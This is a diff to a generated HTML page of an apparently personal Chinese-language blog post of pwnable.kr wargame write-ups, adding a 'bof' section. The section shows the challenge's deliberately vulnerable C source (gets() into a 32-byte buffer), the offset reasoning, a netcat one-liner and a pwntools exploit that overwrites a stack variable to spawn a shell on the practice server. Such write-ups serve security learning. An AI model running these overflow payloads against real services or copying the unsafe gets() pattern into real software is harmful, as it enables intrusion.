@@ -103,10 +103,12 @@
 <meta property="og:url" content="https://iCyris.github.io/2018/03/12/pwnable-kr/index.html">
 <meta property="og:site_name" content="Cyris | 绿生">
 <meta property="og:description" content="开始学习 pwn 。 网址：http://pwnable.kr">
-<meta property="og:updated_time" content="2018-03-15T09:50:56.000Z">
+<meta property="og:image" content="https://icyris.github.io/2018/03/12/pwnable-kr/bof-1.png">
+<meta property="og:updated_time" content="2018-03-15T12:46:30.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.kr writeup">
 <meta name="twitter:description" content="开始学习 pwn 。 网址：http://pwnable.kr">
+<meta name="twitter:image" content="https://icyris.github.io/2018/03/12/pwnable-kr/bof-1.png">
 
 
 
@@ -479,6 +481,22 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_ssh = ssh(host = <span class="string">'pwnable.kr'</span>, user = <span class="string">'col'</span>, password = <span class="string">'guest'</span>, port = <span class="number">2222</span>)</div><div class="line"><span class="keyword">print</span> (pwn_ssh.connected())</div><div class="line"></div><div class="line">data = <span class="string">'\xc9\xce\xc5\x06'</span> * <span class="number">4</span> + <span class="string">'\xc8\xce\xc5\x06'</span></div><div class="line">sh = pwn_ssh.process(argv = [<span class="string">'col'</span>, data], executable = <span class="string">'./col'</span>)</div><div class="line"><span class="keyword">print</span> (sh.recvall())</div></pre></td></tr></table></figure>
 <p><code>daddy! I just managed to create a hash collision :)</code></p>
 <hr>
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><blockquote>
+<p>Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p>
+<p>Download : <a href="http://pwnable.kr/bin/bof" target="_blank" rel="external">http://pwnable.kr/bin/bof</a><br>Download : <a href="http://pwnable.kr/bin/bof.c" target="_blank" rel="external">http://pwnable.kr/bin/bof.c</a></p>
+<p>Running at : nc pwnable.kr 9000</p>
+</blockquote>
+<p>bof.c : </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</div><div class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</div><div class="line">	gets(overflowme);	<span class="comment">// smash me!</span></div><div class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</div><div class="line">		system(<span class="string">"/bin/sh"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span>&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">	func(<span class="number">0xdeadbeef</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>一道关于缓冲区溢出的题，需要通过 overflow 来覆盖 key 的值。</p>
+<p>ida 载入后进入 func 函数：</p>
+<p><img src="/2018/03/12/pwnable-kr/bof-1.png" alt=""></p>
+<p>a1 的地址为 ebp+8h ，s 的地址为 ebp-2ch，距离差 52，所以要覆盖 52 个字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(python -c <span class="string">"print 'A'*52 + '\xbe\xba\xfe\xca'"</span>; cat) | nc pwnable.kr <span class="number">9000</span> </div><div class="line"><span class="comment"># 同样需要注意后面的字符需要倒序传入；另外这里的 cat 既能让 nc 的 tcp 会话不结束（直到用户输入 Ctrl+C ），又可以将用户输入的内容重定向给 nc。</span></div></pre></td></tr></table></figure>
+<p>exp: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">pwn_socket = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</div><div class="line">pwn_socket.sendline(<span class="string">'A'</span> * <span class="number">52</span> + <span class="string">'\xbe\xba\xfe\xca'</span>)</div><div class="line">pwn_socket.interactive()</div></pre></td></tr></table></figure>
+<p><code>daddy, I just pwned a buFFer :)</code></p>
+<hr>
 
       
     </div>
@@ -702,7 +720,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler’s-Bottle"><span class="nav-text">[Toddler’s Bottle]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Toddler’s-Bottle"><span class="nav-text">[Toddler’s Bottle]</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#fd"><span class="nav-text">fd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#collision"><span class="nav-text">collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bof"><span class="nav-text">bof</span></a></li></ol></li></ol></div>
             
 
           </div>
